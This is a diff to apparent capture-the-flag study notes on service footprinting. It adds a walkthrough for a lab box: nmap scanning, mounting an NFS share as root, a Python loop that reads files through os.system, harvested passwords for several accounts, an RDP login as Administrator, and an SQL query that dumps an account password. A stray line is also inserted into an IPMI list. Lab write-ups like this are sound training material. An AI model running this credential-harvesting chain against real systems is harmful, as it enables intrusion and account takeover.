@@ -768,7 +768,7 @@ curl -X GET http://10.129.204.235/testing.txt
 is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. 
 
 IPMI is typically used in three ways: 
-
+jacob
     
     Before the OS has booted to modify BIOS settings
     When the host is fully powered down
@@ -980,3 +980,34 @@ The initialization of the WMI communication always takes place on TCP port 135, 
 3. Get the password either from doing an ipmi hashdump and dehash with hashcat or brute force with ncrack.
 4. wget -m --no-passive ftp://UN:PW@IP
 5. Use the ssh keys to ssh into the server
+
+
+# Knowledge check for medium
+Check for services: 
+1. Nmap open ports to discover services `nmap -Pn -sC -sV <IP>`
+2. check for publiccly accessible nfs share: `showmount -e <IP>`
+3. Mount `nfs` and notice that nobody is the owner however root has 777. Therefore, mount as root: 
+`mount -t nfs <IP>:/ ./target-NFS/ -o nolock`
+4. Find credentials in nfs:
+```python
+for i in tickets.split('\n'):
+    os.system("sudo cat nfs_mount/{}".format(i))
+```
+```bash
+user="alex"
+password="lol123!mD"
+```
+5. Test the rdp session to no avail
+6. mount the smb share: `sudo mount -t cifs -o username=alex //<IP>/devshare smb_target`. Might have to test the different shares
+7. Find credentials: `sa:87N1ns@slls83`
+8. In the RDP session, we noticed there is another user, `Administrator`, not only `sa` and `alex`, therefore, try RDP with credentials:
+`xfreerdp /u:Administrator /p:"87N1ns@slls83" /v:<IP>`
+9. Access the SQL management service and test query:
+```sql
+SELECT * FROM [accounts].[dbo].[devsacc] WHERE [name]='HTB'
+```
+and get the credentials for `HTB`
+```bash
+id	name	password
+157	HTB	lnch7ehrdn43i7AoqVPK4zWR
+```
